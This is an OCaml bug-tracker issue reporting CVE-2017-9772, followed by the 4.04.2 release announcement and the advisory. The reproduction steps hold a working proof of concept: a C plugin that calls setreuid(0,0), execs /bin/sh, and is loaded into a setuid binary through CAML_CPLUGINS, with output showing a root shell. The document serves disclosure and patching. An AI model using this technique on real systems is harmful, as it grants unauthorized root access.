## Description

[![@vicuna](https://avatars.githubusercontent.com/u/48527417?v=4&size=48)](/vicuna)[vicuna](https://github.com/vicuna)opened [on Jun 15, 2017](https://github.com/ocaml/ocaml/issues/7557#issue-421251599)

**Original bug ID:** 7557

**Reporter:** emilliken

**Assigned to:** [@damiendoligez](https://github.com/damiendoligez)

**Status:** resolved (set by [@damiendoligez](https://github.com/damiendoligez) on 2017-06-23T15:19:47Z)

**Resolution:** fixed

**Priority:** urgent

**Severity:** major

**OS:** \*nix

**Version:** 4.04.0

**Target version:** 4.04.2

**Fixed in version:** 4.04.2

**Category:** runtime system and C interface

**Monitored by:** [@gasche](https://github.com/gasche)

## Bug description

I've marked this issue as private.

By default, it seems the environment variables CAML\_CPLUGINS, CAML\_NATIVE\_CPLUGINS, and CAML\_BYTE\_CPLUGINS can be used to auto-load code into any executable produced with ocamlopt or ocamlc. This can lead to privilege escalation if the binary is marked setuid.

## Steps to reproduce

To demonstrate, as root, do:

# cat > hello.ml << EOF

let \_ =

print\_endline "hello, world"

EOF

# ocamlopt -o hello hello.ml

# chmod +s hello

As an unprivileged user, do:

$ cat > exp.c << EOF

#include <stdio.h>

#include <sys/types.h>

#include <unistd.h>

void caml\_cplugin\_init() {

printf("IN PLUGIN\n");

setreuid(0,0);

execl("/bin/sh", "sh", NULL);

}

EOF

$ gcc -shared -fPIC -o exp.so exp.c

$ id

uid=1002(user) gid=1002(user) groups=1002(user)

$ CAML\_CPLUGINS=./exp.so ./hello

IN PLUGIN

# id

uid=0(root) gid=1002(user) egid=0(root) groups=0(root),1002(user)

## Additional information

It sounds like the fix involves making sure that the effective uid matches the real uid before loading any plugins. Code is in byterun/sys.c

Dear OCaml users,

We have the pleasure of celebrating the birthday of Alan Turing by

announcing the release of OCaml version 4.04.2.

This minor release fixes the security issue described in

CVE-2017-9772 (included below).

All users should eventually upgrade to 4.04.2 from 4.04.0 and 4.04.1.

Any user who produces setuid programs with OCaml should read the CVE

and upgrade immediately.

It is available as an OPAM switch, or as a source download here:

<https://caml.inria.fr/pub/distrib/ocaml-4.04/>

<https://github.com/ocaml/ocaml/archive/4.04.2.tar.gz>

Happy hacking,

-- Damien Doligez for the OCaml team.

OCaml 4.04.2 (23 Jun 2017):

---------------------------

### Security fix:

- PR#7557: Local privilege escalation issue with ocaml binaries.

(Damien Doligez, report by Eric Milliken, review by Xavier Leroy)

--------------------------------------------------------------------

CVE-2017-9772: Privilege escalation in OCaml runtime for SUID executables

The environment variables CAML\_CPLUGINS, CAML\_NATIVE\_CPLUGINS, and

CAML\_BYTE\_CPLUGINS can be used to auto-load code into any ocamlopt-compiled

executable or any ocamlc-compiled executable in ‘custom runtime mode’.

This can lead to privilege escalation if the executable is marked setuid.

Vulnerable versions: OCaml 4.04.0 and 4.04.1

Workarounds:

- Upgrade to OCaml 4.04.2 or higher.

or - Compile the OCaml distribution with the "-no-cplugins" configure option.

or - OPAM users can "opam update && opam switch recompile 4.04.1", as

the repository has had backported patches applied.

Impact: This only affects binaries that have been installed on Unix-like

operating systems (including Linux and macOS) with the setuid bit set.

However, in that situation, any user who execute the program gains all

the privileges of the owner of the executable (meaning that root-owned

setuid executables provide root access).

Fix: OCaml 4.04.2 mitigates this by modifying Sys.getenv and Unix.getenv

to raise an exception if the process has ever had elevated privileges.

The OCaml runtime has also been modified to use this function for

retrieving all of the runtime environment variables which could potentially

cause files to be accessed or modified. The older behaviour is available

in Sys.unsafe\_getenv for applications that require strict compatibility.

Credits: This was originally reported by Eric Milliken on the OCaml Mantis

bug tracker. <https://caml.inria.fr/mantis/view.php?id=7557>
